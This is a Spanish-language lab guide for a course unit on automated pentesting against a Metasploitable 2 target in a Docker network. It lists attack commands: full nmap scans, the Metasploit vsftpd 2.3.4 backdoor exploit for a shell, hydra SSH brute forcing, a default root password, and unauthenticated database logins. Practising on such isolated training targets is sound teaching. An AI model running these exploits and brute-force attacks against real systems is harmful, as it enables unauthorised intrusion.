# 🦸 Unit 5: Pentesting Autónomo - LAB PRÁCTICO

## 🎯 Objetivos

Practicar **pentesting automatizado**:

1. **Metasploit** - Explotación con framework
2. **Escaneo automatizado** - Encontrar vulnerabilidades
3. **Explotación** - Ganar acceso
4. **Post-explotación** - Escalamiento de privilegios

---

## 🏗️ Arquitectura

```
┌──────────────────────────────────────────────────────────────────┐
│                      LABORATORIO 5                                │
│                    PENTESTING AUTÓNOMO                              │
├──────────────────────────────────────────────────────────────────┤
│   ┌─────────────┐                            ┌─────────────┐      │
│   │    KALI    │        ATAQUE              │  METASPLOI  │      │
│   │   LINUX    │  ──────────────────────→  │   TABLE 2   │      │
│   │ (Atacante) │                            │             │      │
│   └─────────────┘                            └─────────────┘      │
│        │                                            │              │
│        │  • Metasploit                            │              │
│        │  • msfvenom                           │              │
│        │  • Nmap                               │              │
│        │        Puertos: 21,22,23,25,80       │              │
│        │        3306,5432,5900,6667           │              │
│        │            RED: 192.168.60.0/24    │              │
└────────┼──────────────────────────────────────────┼──────────────┘
         │
    SSH:2222
```

---

## 🚀 Iniciar

```bash
cd docker-labs/unit5
docker-compose up -d
```

---

## ⚔️ EJERCICIOS DE ATAQUE

### Ejercicio 1: Escaneo

```bash
ssh root@localhost -p 2222

# Escaneo completo
nmap -sV -sC -p- 192.168.60.x

# Guardar resultados
nmap -sV -sC -p- 192.168.60.x -oN scan.txt
```

### Ejercicio 2: Metasploit

```bash
# Iniciar Metasploit
msfconsole

# Buscar exploits
search type:exploit platform:linux

# Usar exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.60.x
run

# Obtener shell
shell
```

### Ejercicio 3: Explotación SSH

```bash
# Fuerza bruta SSH
hydra -l root -P wordlist.txt 192.168.60.x ssh

# Conexión directa
ssh root@192.168.60.x
# Password: msfadmin
```

### Ejercicio 4: Servicios Vulnerables

```bash
# FTP vsftpd (puerto 21)
nmap --script=ftp-anon 192.168.60.x

# MySQL (puerto 3306)
mysql -h 192.168.60.x -u root

# PostgreSQL (puerto 5432)
psql -h 192.168.60.x -U postgres
```

---

## 🛑 Cleanup

```bash
docker-compose down -v
```
